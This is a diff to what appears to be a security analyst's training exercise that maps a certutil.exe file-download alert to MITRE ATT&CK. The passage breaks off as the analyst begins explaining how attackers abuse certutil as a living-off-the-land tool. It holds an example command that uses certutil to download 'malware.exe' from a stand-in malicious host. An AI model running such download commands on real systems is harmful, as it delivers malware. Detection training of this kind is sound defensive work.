@@ -1,9 +1,9 @@
 ## TASK 3: MITRE ATT&CK Mapping – Certutil File Download
 # Alert Description
-User Finance_Admin used certutil.exe to download a file from http://badsite.xyz/malware.exe
+User Finance_Admin used certutil.exe to download a file from "http://badsite.xyz/malware.exe"
 
 # Example Command:
-certutil.exe -urlcache -split -f http://badsite.xyz/malware.exe
+certutil.exe -urlcache -split -f "http://badsite.xyz/malware.exe"
 
 ## My first Thought 
 certutil.exe is a legitimate Microsoft Windows utility, but attackers often abuse it as a Living-off-the-Land (LoLBin) tool to:
